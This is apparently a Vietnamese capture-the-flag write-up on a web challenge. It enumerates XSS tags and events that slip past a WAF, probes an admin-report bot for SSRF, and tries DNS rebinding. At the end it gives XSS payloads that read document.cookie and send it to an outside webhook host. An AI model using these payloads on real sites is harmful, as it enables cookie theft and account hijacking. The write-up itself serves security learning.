

---
Tài liệu/Bài báo tham khảo:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://hacktricks.wiki/ja/pentesting-web/xss-cross-site-scripting/xss-information-exfiltration-payload.html

https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html




---

Mình thấy bài tập có cung cấp các từ khóa bị chặn bởi WAF:
![[Attachments/Pasted image 20261101135531.png]]


Do đó việc đầu tiên của mình làm là mình đã viết một script nho nhỏ để tìm xem tag/event nào ko bị chặn bằng cách copy tất cả tag/event trong XSS Cheat Sheet của PorrtSwigger:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
![Pasted image 20261017212603](Attachments/Pasted%20image%2020261017212603.png)

Result:
```
Event bypass:
['onbeforematch', 'onbeforepaste', 'oncancel', 'oncommand', 'oncontentvisibilityautostatechange', 'oncontentvisibilityautostatechange(hidden)', 'ondragexit', 'onfocus(autofocus)', 'onformdata', 'ongesturechange', 'ongestureend', 'ongesturestart', 'ongotpointercapture', 'onloadstart', 'onlocation', 'onlostpointercapture', 'onpagereveal', 'onpageswap', 'onpointercancel', 'onpromptaction', 'onpromptdismiss', 'onscrollsnapchange', 'onscrollsnapchanging', 'onsecuritypolicyviolation', 'onslotchange', 'onstream', 'onsuspend', 'ontoggle(popover)', 'ontouchcancel', 'onvalidationstatuschange', 'onwaiting', 'onwaiting(loop)', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitmouseforcechanged', 'onwebkitmouseforcedown', 'onwebkitmouseforceup', 'onwebkitmouseforcewillbegin', 'onwebkitneedkey', 'onwebkitplaybacktargetavailabilitychanged', 'onwebkitpresentationmodechanged', 'onwebkittransitionend', 'onwebkitwillrevealbottom']
----------
Tag bypass:
['a', 'abbr', 'acronym', 'animate', 'animatemotion', 'animatetransform', 'area', 'article', 'aside', 'b', 'base', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'input', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'wbr', 'xmp', 'xss']
```
/feature không tồn tại:
![[Attachments/Pasted image 20261101140958.png]]

/admin bị 403:
![[Attachments/Pasted image 20261101141011.png]]


Nhưng test một lúc thì mình thấy vô lý cực kì :)) Sao <> đều bị escape hết rồi thì XSS đường nào được ?? Khó hiểu. Nên mình đặt ra nghi vấn chắc là Challenge này đang troll troll, ko thể có XSS được:
![Pasted image 20261017213006](Attachments/Pasted%20image%2020261017213006.png)

![Pasted image 20261017214628](Attachments/Pasted%20image%2020261017214628.png)
![Pasted image 20261017214703](Attachments/Pasted%20image%2020261017214703.png)

![Pasted image 20261017214712](Attachments/Pasted%20image%2020261017214712.png)


Sau đó mình test thêm thì thấy endpoint gửi report cho admin khá thú vị:
![[Attachments/Pasted image 20261101135941.png]]

Nó nhận link trực tiếp ở local luôn, mình thử đổi bằng link webhook của mình thì vẫn nhận được request khá ảo :)) Nên mình nghĩ đến hướng SSRF:
![[Attachments/Pasted image 20261101140259.png]]
![[Attachments/Pasted image 20261101140617.png]]

Trước hết thì mình thử các protocol đặc biệt như file://
Mình ko biết có hoạt động không do chỉ hiện status ok ;-; Ko có gì đặc biệt nên tạm thời mình thử cách khác.

Lúc này mình đọc được một method khá hay trên hacktricks là DNS Rebinding, mình thấy hợp với challenge vì định hướng lúc này của mình đang là redirect bot đến server mình kiếm soát, sau đó có thể CSRF để admin thực hiện hành vi gì đó ở trang /admin. Vấn đề là mình chưa biết /admin có các nội dung gì ;-;
Mình đã thử thêm một số header tùy chỉnh như kiểu X-Forwarded-For: 127.0.0.1, X-Host-Ip: 127.0.0.1,... đổi referer thành 127.0.0.1:9090... nhưng mọi cách đều không đánh lừa được server.

Thế thì mình mới tiến hành tấn công thử theo hướng DNS Rebinding. Mình dựng VPS, sau đó viết payload CSRF dạng:


http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/

![[Attachments/Pasted image 20261101141502.png]]



<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>


```
function exfil_by_rq_get(info_name, text) {
  var xhttp = new XMLHttpRequest();
  xhttp.open(
    "GET",
    "https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net" +
      "/exfil_by_rq_get/" +
      "c" +
      "?" +
      "c" +
      "=" +
      document.cookie,
    true
  );
  xhttp.send()
}
```



<style>@keyframes x{}</style>
<b style="animation-name:x" onwebkitanimationstart="
  var xhttp = new XMLHttpRequest();
  xhttp.open('GET', 'https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/exfil_by_rq_get/c?c=' + document.cookie, true);
  xhttp.send();
"></b>